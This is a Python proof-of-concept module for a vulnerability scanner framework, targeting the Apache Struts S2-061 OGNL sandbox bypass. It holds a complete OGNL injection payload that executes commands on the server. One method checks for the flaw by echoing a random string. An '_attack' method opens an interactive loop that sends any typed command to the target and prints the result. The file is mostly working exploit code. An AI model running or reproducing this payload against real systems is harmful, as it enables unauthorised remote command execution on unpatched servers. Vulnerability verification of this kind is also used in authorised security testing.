#!/usr/bin/env python3
# -*- coding:utf-8 -*-
import sys
from newpoc.cli import POC_QUEUE
from newpoc.api import PocBase, Output, requests, OrderedDict, encode_multipart_formdata
from newpoc.utils.randim_str import generate_random_str


class POC(PocBase):
    cnvd_cve = 'S2-061'  # 漏洞编号
    version = '1'  # 默认为1
    author = 'myxae86'  # PoC 作者名字
    vulDate = '2020-12-08'  # 漏洞公开的时间
    createDate = '2022-11-28'  # 编写 PoC 的日期
    updateDate = '2022-11-28'  # PoC 更新的时间，默认和编写时间一样
    references = []  # 漏洞地址来源
    name = 'S2-061 远程命令执行'  # PoC 名称
    appPowerLink = 'https://struts.apache.org/'  # 漏洞厂商主页地址
    appName = 'Apache Struts'  # 漏洞应用名称
    appVersion = '2.0.0/2.5.25'  # 漏洞影响版本
    vulType = 'RCE'  # 漏洞类型
    desc = '''
        S2-061是对S2-059的绕过，Struts2官方对S2-059的修复方式是加强OGNL表达式沙盒，
        而S2-061绕过了该沙盒。该漏洞影响版本范围是Struts 2.0.0到Struts 2.5.25。
    '''  # 漏洞简要描述
    samples = ['192.168.1.23']  # 测试样列，就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = "pocs/Struts2/S2-061.py"

    output = Output()

    def _verify(self, ip=None):
        result = POC.parse_output()
        ip = ip['url']

        random_string = generate_random_str()
        headers = {
            'Host': '127.0.0.1',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
            'Connection': 'close',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF',
        }

        params = OrderedDict([("id", (None,
                                      '%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("echo ' + random_string + '")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}',
                                      'multipart/form-data'))])

        rce_data = encode_multipart_formdata(params, boundary='----WebKitFormBoundaryl7d1B1aGsV2wcZwF')
        try:
            res = requests.post(ip, headers=headers, data=rce_data[0])
            if res.text.find(random_string) != -1 and res.status_code == 200:
                self.output.success('S2-061:{} is vulnerable '.format(ip))
                result['target-url'] = ip
                result['payload'] = ''
                POC_QUEUE.put(result)
                return (ip, headers)
            else:
                self.output.fail('S2-061:{} is not vulnerable '.format(ip))
        except Exception as err:
            self.output.fail('S2-061:{0} is fail {1}'.format(ip, err))

    def _attack(self, payload=None):
        try:
            url, header = self._verify(payload)
            while True:
                cmd = input("[master]:")
                params = OrderedDict([("id", (None,
                                              '%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("' + cmd + '")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}',
                                              'multipart/form-data'))])

                rce_data = encode_multipart_formdata(params, boundary='----WebKitFormBoundaryl7d1B1aGsV2wcZwF')
                if cmd == 'exit':
                    sys.exit(0)
                cmd_res = requests.post(url, headers=header, data=rce_data[0]).text
                print(cmd_res)
        except:
            pass

    def _shell(self):
        pass

    @staticmethod
    def parse_output():
        result = {
            "target-url": '',
            "poc-name": POC.name,
            "poc-id": POC.cnvd_cve,
            "component": POC.vulType,
            "version": POC.appVersion,
            "status": 'ok',
            "payload": ''
        }
        return result


if __name__ == "__main__":
    c = POC()
    print(c.parse_detail())
